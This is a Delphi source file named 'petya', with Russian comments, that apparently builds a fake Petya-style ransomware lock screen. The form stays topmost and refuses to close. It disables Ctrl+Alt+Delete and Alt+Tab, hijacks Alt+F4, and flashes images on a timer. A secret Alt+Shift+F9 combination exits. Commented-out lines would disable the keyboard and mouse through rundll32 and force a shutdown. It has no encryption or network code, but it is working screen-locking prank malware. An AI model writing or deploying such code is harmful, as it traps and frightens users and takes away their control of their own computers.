unit petya;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, jpeg,
  ShellAPI,
  ExtCtrls;

type
  TForm1 = class(TForm)
    img1: TImage;
    tmr1: TTimer;
    Timer1: TTimer;
    procedure FormShow(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure DisablebtnClick(Sender: TObject);
    procedure EnablebtnClick(Sender: TObject);
    procedure FormActivate(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure Timer1Timer(Sender: TObject);
  private
    procedure WMHotkey( var msg: TWMHotkey ); message WM_HOTKEY;
    procedure WMQueryEndSession(var Message: TMessage); message WM_QUERYENDSESSION;
  public
  end;

    procedure BlockInput(ABlockInput : Boolean); stdcall; external 'USER32.DLL';

var
  Form1: TForm1;
  win: string;
  tik: Integer;
  Bmp0,Bmp1: TBitmap;

implementation

{$R *.dfm}

//Удачно выйти из Винды
procedure TForm1.WMQueryEndSession(var Message: TMessage);
begin
  Message.Result := 1;
  Application.Terminate;
end;

function GetWindowsFolder:string;
var p:PChar;
begin
  GetMem(p, MAX_PATH);
  result:='';
  if GetWindowsDirectory(p, MAX_PATH)>0 then
  result:=string(p);
  FreeMem(p);
end;


function EnablePrivilege (Privilege: string): boolean;
var
  tp: TOKEN_PRIVILEGES;
  th: THandle;
  n:  DWORD;
begin
  n := 0;
  tp.PrivilegeCount := 1;
  tp.Privileges[0].Luid := 0;
  tp.Privileges[0].Attributes := SE_PRIVILEGE_ENABLED;
  if OpenProcessToken(GetCurrentProcess, TOKEN_ADJUST_PRIVILEGES, th) then begin
    if LookupPrivilegeValue(nil, PChar(Privilege), tp.Privileges[0].Luid) then
      AdjustTokenPrivileges(th, False, tp, sizeof(TOKEN_PRIVILEGES), nil, n);
    Closehandle(th);
  end;
  Result := GetLastError = ERROR_SUCCESS;
end;

procedure TForm1.WMHotkey( var msg: TWMHotkey );
var
  MyBmp: TBitmap;
begin
  if msg.hotkey = 1 then
  begin
     Timer1.Enabled:=False;
     EnablePrivilege('SESHUTDOWNPRIVILEGE');
     //"rundll32 keyboard,disable" - заблокироовать клавиатуру
     //"rundll32 mouse,disable" - заблокировать мышь
     //ShellExecute(Handle,'open',PAnsiChar(win+'\Rundll32.exe'),PAnsiChar('keyboard,disable'),PAnsiChar(win),SW_HIDE);
     //ShellExecute(Handle,'open',PAnsiChar(win+'\Rundll32.exe'),PAnsiChar('mouse,disable'),PAnsiChar(win),SW_HIDE);
     //ExitWindowsEx(EWX_Force + EWX_FORCEIFHUNG + EWX_PowerOff + EWX_ShutDown, 0);
     Application.Terminate;
     Exit;
  end;
  if msg.hotkey = 2 then
  begin
    Timer1.Enabled:=False;
    MyBmp := TBitmap.Create;
  try
    MyBmp.LoadFromResourceName(HInstance, 'vp');
    img1.Stretch:=True;
    img1.Picture.Assign(MyBmp);
    Application.ProcessMessages;
  finally
    MyBmp.Free;
  end;
  end;
  if msg.hotkey = 3 then
  begin
    Timer1.Enabled:=False;
    MyBmp := TBitmap.Create;
  try
    MyBmp.LoadFromResourceName(HInstance, 'kp');
    img1.Stretch:=False;
    img1.Picture.Assign(MyBmp);
    Application.ProcessMessages;
  finally
    MyBmp.Free;
  end;
  end;
  if msg.hotkey = 0 then
  begin
     Timer1.Enabled:=True;
  end;
end;

//Отключить Ctrl+Alt+Delete
procedure TForm1.DisablebtnClick(Sender: TObject);
var
  b: boolean;
begin
  b := false;
  SystemParametersInfo(SPI_SCREENSAVERRUNNING, 1, @b, 0);
  SystemParametersInfo(SPI_SCREENSAVERRUNNING, 1, nil, 0);//Блокировка Alt+Tab 
end;

//Включить Ctrl+Alt+Delete
procedure TForm1.EnablebtnClick(Sender: TObject);
var
  b: boolean;
begin
  b := false;
  SystemParametersInfo(SPI_SCREENSAVERRUNNING, 0, @b, 0);
  SystemParametersInfo(SPI_SCREENSAVERRUNNING, 0, nil, 0);//Разблокировка Alt+Tab
end;

procedure TForm1.FormShow(Sender: TObject);
begin
SetForegroundWindow(Form1.Handle);
SetWindowPos(Form1.Handle,HWND_TOPMOST,0,0,0,0,SWP_NOMOVE+SWP_NOSIZE);
end;

procedure TForm1.FormCreate(Sender: TObject);
begin
   tik:=10;
   win:=GetWindowsFolder;
if not RegisterHotkey(Handle, 1, MOD_ALT or MOD_SHIFT, VK_F9) then
   ShowMessage('Unable to assign Alt-Shift-F9 as hotkey.');
if not RegisterHotkey(Handle, 2, MOD_ALT, VK_F4) then
   ShowMessage('Unable to assign Alt-F4 as hotkey.');
if not RegisterHotkey(Handle, 3, MOD_ALT, VK_F3) then
   ShowMessage('Unable to assign Alt-F3 as hotkey.');
if not RegisterHotkey(Handle, 0, MOD_ALT, VK_F1) then
   ShowMessage('Unable to assign Alt-F1 as hotkey.');
end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
UnRegisterHotkey( Handle, 1 );
UnRegisterHotkey( Handle, 2 );
UnRegisterHotkey( Handle, 3 );
UnRegisterHotkey( Handle, 0 );
end;

procedure TForm1.FormActivate(Sender: TObject);
var
  MyBmp: TBitmap;
begin
  DisablebtnClick(Self);
  MyBmp := TBitmap.Create;
  try
    MyBmp.LoadFromResourceName(HInstance, 'kp');
    img1.Stretch:=False;
    img1.Picture.Assign(MyBmp);
  finally
    MyBmp.Free;
  end;
  Application.ProcessMessages;
  Timer1.Enabled:=True;
end;

procedure TForm1.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  CanClose:=False;
end;

procedure TForm1.Timer1Timer(Sender: TObject);
var
  MyBmp: TBitmap;
begin
  tik:=tik-1;
  if tik <= 5 then begin
  MyBmp := TBitmap.Create;
  try
    MyBmp.LoadFromResourceName(HInstance, 'kp');
    img1.Stretch:=False;
    img1.Picture.Assign(MyBmp);
  finally
    MyBmp.Free;
  end;
  end;
  if tik <= 0 then begin
     tik:=10;
  MyBmp := TBitmap.Create;
  try
    MyBmp.LoadFromResourceName(HInstance, 'vp');
    img1.Stretch:=True;
    img1.Picture.Assign(MyBmp);
  finally
    MyBmp.Free;
  end;
  end;
end;

end.
